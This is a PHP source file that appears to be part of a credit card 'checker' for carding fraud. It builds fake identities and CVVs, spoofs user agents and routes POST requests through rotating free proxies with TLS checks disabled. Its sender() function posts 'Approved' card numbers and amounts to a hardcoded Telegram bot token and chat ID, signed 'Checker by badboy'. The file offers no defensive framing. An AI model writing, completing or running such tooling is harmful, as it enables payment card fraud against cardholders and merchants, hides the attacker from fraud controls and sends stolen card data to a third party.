<?php

function generateFakeData() {
    $domains = ['gmail.com', 'gmail.com', 'gmail.com'];
    $firstNames = ['John', 'Jane', 'Michael', 'Emily', 'David', 'Sarah'];
    $lastNames = ['Doe', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones'];
    $cities = ['Cityville', 'Townsville', 'Villageton'];
    $states = ['CA', 'NY', 'TX', 'FL', 'WA'];
    $cvvs = ['001', '002', '003', '004', '005', '006', '007', '008', '009'];

    $randomDomain = $domains[array_rand($domains)];
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    $city = $cities[array_rand($cities)];
    $state = $states[array_rand($states)];
    $rcvv = $cvvs[array_rand($cvvs)];

    $fakeData = [
        'email' => strtolower($firstName) . '.' . strtolower($lastName) . rand(10, 99) . '@' . $randomDomain,
        'username' => strtolower($firstName) . rand(1000, 9999),
        'password' => 'Pass' . rand(1000, 9999) . '!',
        'address' => rand(100, 999) . ' ' . $city . ' St, ' . $city . ', ' . $state . ' ' . rand(10000, 99999),
        'phone' => '+1 (' . rand(200, 999) . ') ' . rand(100, 999) . '-' . rand(1000, 9999),
        'fullName' => $firstName . ' ' . $lastName,
        'randomNumber' => rand(100000, 999999),
        'rcvv' => $rcvv,
    ];

    return $fakeData;
}

// Example of fetching and including random user agent
function getRandomUserAgent() {
    $userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" . rand(50, 99) . ".0.3945.88 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" . rand(50, 99) . ".0.3945.88 Mobile Safari/537.36",
    ];

    return $userAgents[array_rand($userAgents)];
}

$fakeData = generateFakeData();
$fakeData['userAgent'] = getRandomUserAgent();



function CurlX($url, $headers, $data) {
    $ch = curl_init();
    $maxRetries = 5; // Maximum number of retries
    $retryCount = 0; // Current retry count
    $waitTime = 1; // Initial wait time in seconds

    do {
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        // Fetch a list of free rotating proxies
        $proxyList = getFreeProxies();
        if (!empty($proxyList)) {
            // Randomly select a proxy from the list
            $proxy = $proxyList[array_rand($proxyList)];
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
        }

        // Execute the cURL request
        $response = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);

        // Check for rate limit error
        if ($http_status === 429) {
            // Wait before retrying
            sleep($waitTime);
            $waitTime *= 2; // Exponential backoff
            $retryCount++;
        } else {
            break; // Exit the loop if the request was successful or if it's not a rate limit error
        }

    } while ($retryCount < $maxRetries);

    // Close the cURL session
    curl_close($ch);

    // Prepare the response
    $result = [
        'http_status' => $http_status,
        'error' => $curl_error ? $curl_error : null
    ];

    // Try to decode the response if it's a valid JSON string
    $decodedResponse = json_decode($response, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        $result['response'] = $decodedResponse; // Store decoded response
    } else {
        $result['response'] = $response; // Store raw response if decoding fails
    }

    // Return the structured response as JSON
    return json_encode($result);
}


// Function to get free proxies
function getFreeProxies() {
    $proxyUrl = 'https://www.proxy-list.download/api/v1/get?type=https'; // Example API for free proxies
    $proxies = file($proxyUrl, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return $proxies ?: []; // Return an array of proxies or an empty array if none found
}

// Function to show only the IP used via a specified proxy
function getIpUsingProxy($proxy) {
    $url = 'http://api.ipify.org'; // A simple service to get your public IP address
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_PROXY, $proxy); // Set the proxy
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    // Execute the cURL request
    $response = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Check for errors and return only the IP if successful
    if ($http_status === 200) {
        return trim($response); // Return the IP address
    } else {
        return "Error: Unable to fetch IP using proxy ($proxy). HTTP Status: $http_status.";
    }
}

// Example usage
$proxies = getFreeProxies(); // Fetch the list of free proxies

if (!empty($proxies)) {
    // Randomly select a proxy from the list
    $proxy = $proxies[array_rand($proxies)];
    $ip = getIpUsingProxy($proxy);
    echo "PROXY [🟢] $proxy";
} else {
    echo "PROXY[🔴]";
}

function sender($lista, $msg, $amount) {
    // Replace with your Telegram bot token and chat ID
    $botToken = '7679284056:AAHhvy8-dXEeXILGT78DurPrLiUqk3tx6z4';
    $chatId = '6473717870';
    
    // Format the message
    $message = "
⸢⸮⸥ 𝘾𝘾 => $lista
⸢⸮⸥ 𝙎𝙩𝙖𝙩𝙪𝙨 => Approved! ✅
⸢⸮⸥ 𝙍𝙚𝙨𝙪𝙡𝙩 => $msg
⸢⸮⸥ 𝘼𝙢𝙤𝙪𝙣𝙩 => $amount
⸻⸻⸻⸻⸻⸻
Checker by badboy
";

    // Set up the data array for the request
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    // Make the HTTP request to send the message
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ]
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    // Optional: Handle response or errors here if needed
    return $response;
}